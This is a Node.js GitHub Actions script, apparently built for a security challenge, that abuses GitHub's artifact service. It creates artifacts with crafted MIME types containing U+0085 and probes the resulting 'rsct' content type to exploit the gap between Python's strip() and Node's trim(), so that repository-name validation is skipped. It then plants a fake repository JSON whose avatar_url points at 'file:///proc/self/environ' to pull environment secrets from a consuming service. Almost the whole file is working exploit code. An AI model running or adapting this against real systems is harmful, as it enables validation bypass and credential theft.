// repo-cassette carrier builder / rsct prober.
//
// Measured so far:
//   * CreateArtifact + PUT + FinalizeArtifact all work from a JS action, and api.github.com serves
//     our exact bytes at /repos/{o}/{r}/actions/artifacts/{id}/zip  (BODY_MATCHES=true)
//   * the served Content-Type is NOT the blob's: GitHub's redirect pins it through the SAS "rsct"
//     parameter (rsct="application/zip"), so all five blob content types served as zip
//
// What the challenge needs: Python (requests) must see "application/json" after .strip() while
// Node must NOT see exactly "application/json" after .trim() (else it validates the repository
// name, and ours has extra path segments). Only U+0085 and U+001C..1F live in that gap, and Node
// refuses to re-emit U+001C..1F, so rsct has to look like "application/json\u0085".
//
// So: probe whether rsct depends on the artifact version/name, then build the carrier with the
// best variant found.

const https = require('node:https');
const { URL } = require('node:url');
const crypto = require('node:crypto');

const RESULTS = process.env.ACTIONS_RESULTS_URL || process.env.ACTIONS_RUNTIME_URL;
const RUNTIME = process.env.ACTIONS_RUNTIME_TOKEN;
const GH_TOKEN = process.env.GH_TOKEN;
const REPO = process.env.REPO;
const PAD_TO = 512;
const NEL = '\u0085';

if (!RUNTIME || !RESULTS) throw new Error('run this as a JS action (uses: ./), not a run: step');

function req(method, url, headers, body) {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const r = https.request({ method, hostname: u.hostname, path: u.pathname + u.search, headers },
      (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => resolve({
          status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks),
        }));
      });
    r.on('error', reject);
    if (body) r.write(body);
    r.end();
  });
}

const ids = (() => {
  const payload = JSON.parse(Buffer.from(RUNTIME.split('.')[1], 'base64url').toString('utf8'));
  const scope = (Array.isArray(payload.scp) ? payload.scp.join(' ') : String(payload.scp || ''))
    .split(' ').find((s) => s.startsWith('Actions.Results:'));
  const [, run, job] = scope.split(':');
  return { workflow_run_backend_id: run, workflow_job_run_backend_id: job };
})();

const twirp = (rpc, payload) => req('POST',
  `${RESULTS.replace(/\/$/, '')}/twirp/github.actions.results.api.v1.ArtifactService/${rpc}`,
  { 'content-type': 'application/json', authorization: `Bearer ${RUNTIME}` },
  JSON.stringify(payload));

const api = (path) => req('GET', `https://api.github.com${path}`, {
  authorization: `Bearer ${GH_TOKEN}`, accept: 'application/vnd.github+json', 'user-agent': 'forge',
});

const putBlob = (signedUrl, bytes, contentType) => req('PUT', signedUrl, {
  'x-ms-blob-type': 'BlockBlob',
  'x-ms-version': '2021-08-06',
  'content-length': String(bytes.length),
  ...(contentType ? { 'x-ms-blob-content-type': contentType } : {}),
}, bytes);

// padded to a fixed size so the artifact id (length known only after finalize) never changes the
// byte count we declared at finalize time
function build(id) {
  const mk = (pad) => Buffer.from(JSON.stringify({
    full_name: `${REPO.toLowerCase()}/actions/artifacts/${id}/zip`,
    description: 'repo cassette'.padEnd(pad, '.'),
    stargazers_count: 0,
    owner: { login: 'rc', avatar_url: 'file:///proc/self/environ' },
  }), 'utf8');
  let pad = 13;
  while (mk(pad).length < PAD_TO) pad += 1;
  return mk(pad);
}

async function findId(name) {
  for (let i = 0; i < 10; i += 1) {
    const list = await api(`/repos/${REPO}/actions/artifacts?per_page=100`);
    if (list.status === 200) {
      const hit = (JSON.parse(list.body.toString('utf8')).artifacts || [])
        .filter((a) => a.name === name).sort((a, b) => b.id - a.id)[0];
      if (hit) return hit.id;
    }
    await new Promise((r) => setTimeout(r, 2000));
  }
  return null;
}

// GetSignedArtifactURL hands back the SAS url directly, so rsct can be read without the
// api.github.com redirect dance
async function signedUrlFor(name) {
  const r = await twirp('GetSignedArtifactURL', { ...ids, name });
  if (r.status !== 200) return { ok: false, status: r.status, body: r.body.toString('utf8').slice(0, 160) };
  try {
    const u = new URL(JSON.parse(r.body.toString('utf8')).signed_url);
    return { ok: true, rsct: u.searchParams.get('rsct'), rscd: u.searchParams.get('rscd') };
  } catch (e) {
    return { ok: false, status: r.status, body: r.body.toString('utf8').slice(0, 160) };
  }
}

async function inspect(id) {
  const dl = await api(`/repos/${REPO}/actions/artifacts/${id}/zip`);
  if (!dl.headers.location) return { status: dl.status, rsct: null, served: null };
  const loc = new URL(dl.headers.location);
  const final = await req('GET', dl.headers.location, { 'user-agent': 'forge' });
  return {
    status: dl.status,
    rsct: loc.searchParams.get('rsct'),
    rscd: loc.searchParams.get('rscd'),
    served: final.headers['content-type'] || '',
    body: final.body,
  };
}

// usable = Python's strip() reduces it to application/json, JS's trim() does not
function usable(ct) {
  if (!ct) return false;
  const head = ct.split(',')[0].split(';')[0];
  const py = head.replace(/^[\s\u0085\u001c-\u001f]+|[\s\u0085\u001c-\u001f]+$/g, '').toLowerCase();
  return py === 'application/json' && head.trim().toLowerCase() !== 'application/json';
}

(async () => {
  const stamp = Date.now();
  // Never tested before: v4/v6 WITH a mime_type. Our earlier v4/v6 runs sent no mime_type at all
  // (rsct was pinned to application/zip), and v7 validates it strictly. If an older version stores
  // mime_type without validating and still uses it for rsct, the NEL variant gets through.
  const NELLEAD = '\u0085application/json';
  const NELTAIL = 'application/json\u0085';
  const trials = [
    { v: 6, mime: NELLEAD, tag: 'v6-lead' },
    { v: 6, mime: NELTAIL, tag: 'v6-tail' },
    { v: 6, mime: 'application/json', tag: 'v6-clean' },
    { v: 4, mime: NELLEAD, tag: 'v4-lead' },
    { v: 4, mime: 'application/json', tag: 'v4-clean' },
    { v: 7, mime: NELLEAD, tag: 'v7-lead(control)' },
  ].map((t) => ({ ...t, name: `${t.tag.replace(/[^a-z0-9-]/gi, '')}-${stamp}` }));

  let winner = null;
  for (const t of trials) {
    const created = await twirp('CreateArtifact', {
      ...ids, name: t.name, version: t.v, mime_type: t.mime,
    });
    let signed;
    try { signed = JSON.parse(created.body.toString('utf8')).signed_upload_url; } catch { /* noop */ }
    if (!signed) {
      console.log(`[-] ${t.tag} create=${created.status} ${created.body.toString('utf8').slice(0, 120)}`);
      continue;
    }
    const placeholder = build(0);
    const put = await putBlob(signed, placeholder, t.mime);
    const fin = await twirp('FinalizeArtifact', {
      ...ids, name: t.name, size: String(PAD_TO),
      hash: `sha256:${crypto.createHash('sha256').update(placeholder).digest('hex')}`,
    });
    const sig = await signedUrlFor(t.name);
    const id = fin.status === 200 ? await findId(t.name) : null;
    const dl = id ? await inspect(id) : {};
    const hex = (x) => Buffer.from(x || '', 'latin1').toString('hex');
    const hit = (sig.rsct && sig.rsct.includes('\u0085')) || (dl.served && dl.served.includes('\u0085'));
    console.log(`[*] ${t.tag} create=200 put=${put.status} finalize=${fin.status} id=${id}`
      + ` rsct=${JSON.stringify(sig.rsct)} rsct_hex=${hex(sig.rsct)}`
      + ` served=${JSON.stringify(dl.served)} served_hex=${hex(dl.served)}${hit ? '  <-- HIT' : ''}`);
    if (hit && id && !winner) winner = { ...t, id, signed, served: dl.served, rsct: sig.rsct };
  }

  console.log('\n===== HAND THIS BACK =====');
  console.log('HIT=' + Boolean(winner));
  if (winner) {
    // leave the carrier in place: payload referencing its own id, served with the odd content type
    const payload = build(winner.id);
    const put2 = await putBlob(winner.signed, payload, winner.mime);
    const dl = await inspect(winner.id);
    console.log('TAG=' + winner.tag);
    console.log('REPOSITORY=' + `${REPO.toLowerCase()}/actions/artifacts/${winner.id}/zip`);
    console.log('ARTIFACT_ID=' + winner.id);
    console.log('REPUT=' + put2.status);
    console.log('SERVED_CT_HEX=' + Buffer.from(dl.served || '', 'latin1').toString('hex'));
    console.log('BODY_OK=' + (dl.body ? dl.body.equals(payload) : false));
    console.log('BODY_B64=' + (dl.body ? dl.body.toString('base64') : ''));
    console.log('SHA256=' + crypto.createHash('sha256').update(payload).digest('hex'));
  }
})().catch((e) => { console.error('[x]', e); process.exit(1); });